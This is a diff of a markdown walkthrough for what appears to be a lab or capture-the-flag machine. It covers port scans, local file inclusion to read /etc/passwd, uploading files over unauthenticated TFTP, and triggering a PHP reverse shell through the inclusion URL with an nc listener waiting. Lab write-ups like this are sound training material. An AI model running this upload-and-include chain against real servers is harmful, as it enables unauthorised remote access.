@@ -31,6 +31,50 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds
 ```
+
+## Scan UDP Ports (slow...)
+
+```
+# nmap -Pn -sU 10.129.95.185
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 18:54 EDT
+Nmap scan report for 10.129.95.185
+Host is up (0.28s latency).
+Not shown: 980 closed udp ports (port-unreach)
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+772/udp   open|filtered cycleserv2
+773/udp   open|filtered notify
+789/udp   open|filtered unknown
+1059/udp  open|filtered nimreg
+1072/udp  open|filtered cardax
+1214/udp  open|filtered fasttrack
+3457/udp  open|filtered vat-control
+17077/udp open|filtered unknown
+17468/udp open|filtered unknown
+19322/udp open|filtered unknown
+20019/udp open|filtered unknown
+20717/udp open|filtered unknown
+21111/udp open|filtered unknown
+28122/udp open|filtered unknown
+44923/udp open|filtered unknown
+49170/udp open|filtered unknown
+49182/udp open|filtered unknown
+62677/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1314.76 seconds
+
+```
+
+## Port 69: tftp (UDP)
+> Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
+
+Need some version information: (see man page)
+```
+# tftp -V 10.129.95.185         
+tftp-hpa 5.3, without readline
+```
+
 ## Port 80
 
 ```
@@ -67,7 +111,30 @@ LFI is the process of including files, ***that are already locally present on th
 
 Easy test for LFI: `http://10.129.95.185/?file=../../../../../etc/passwd` and see if you get the file contents. If you do, it's vulnerable.
 
-### DirBusting with dirb
+Check out the /etc/passwd file on the target: 
+```
+# curl 'http://10.129.95.185/?file=/etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+[snip for space]
+mike:x:1000:1000:mike:/home/mike:/bin/bash
+tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+```
+- Note the last "user" (tftp) and the default working directory `/var/lib/tftpboot/`. 
+
+### Upload a test file via tftp 
+```
+echo 'this is a test' > test.txt
+tftp -4 -v 10.129.95.185 -c put test.txt
+```
+
+Load that with the LFI vulnerability in the URL: `http://10.129.95.185/?file=/var/lib/tftpboot/test.txt`
+- If your text loads in the browser window, you're good.
+- Continued below DirBusting...
+
+
+## DirBusting 
+
+Unnecessary. Since you can traverse the directory structure via LFI, just use the default directories in /etc/passwd as above.
 
 ```
 # dirb http://10.129.95.185
@@ -104,47 +171,28 @@ END_TIME: Tue Aug 20 19:16:04 2024
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
+## Uplaod a Reverse Shell Payload
 
-## Scan UDP Ports (slow...)
+Use: [PentestMonkey Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell)
+- Download it. Open in it VIM and change two variables (indicated with the comment `// CHANGE THIS`).
+- The first variable `$ip` is the IP address of your attack machine (to receive the reverse shell).
+- The second variable `$port` is the port on the attach machine you want to use to receive the reverse shell.
 
+Upload that modified .php file to the target: 
 ```
-# nmap -Pn -sU 10.129.95.185
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 18:54 EDT
-Nmap scan report for 10.129.95.185
-Host is up (0.28s latency).
-Not shown: 980 closed udp ports (port-unreach)
-PORT      STATE         SERVICE
-68/udp    open|filtered dhcpc
-69/udp    open|filtered tftp
-772/udp   open|filtered cycleserv2
-773/udp   open|filtered notify
-789/udp   open|filtered unknown
-1059/udp  open|filtered nimreg
-1072/udp  open|filtered cardax
-1214/udp  open|filtered fasttrack
-3457/udp  open|filtered vat-control
-17077/udp open|filtered unknown
-17468/udp open|filtered unknown
-19322/udp open|filtered unknown
-20019/udp open|filtered unknown
-20717/udp open|filtered unknown
-21111/udp open|filtered unknown
-28122/udp open|filtered unknown
-44923/udp open|filtered unknown
-49170/udp open|filtered unknown
-49182/udp open|filtered unknown
-62677/udp open|filtered unknown
-
-Nmap done: 1 IP address (1 host up) scanned in 1314.76 seconds
-
+# tftp -4 -v 10.129.95.185 -c put shell.php 
+Connected to 10.129.95.185 (10.129.95.185), port 69
+putting shell.php to 10.129.95.185:shell.php [netascii]
+Sent 5689 bytes in 5.5 seconds [8225 bit/s]
 ```
 
-## tftp (UDP port 69)
-> Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
-
-Need some version information: (see man page)
+Set up a listener on your attack machine: 
 ```
-# tftp -V 10.129.95.185         
-tftp-hpa 5.3, without readline
+# nc -nlvp 1234
+listening on [any] 1234 ...
 ```
 
+Execute the reverse shell via the browswer URL: `http://10.129.95.185/?file=/var/lib/tftpboot/shell.php`
+- Attach machine receives the reverse shell.
+- User: www-data
+- 
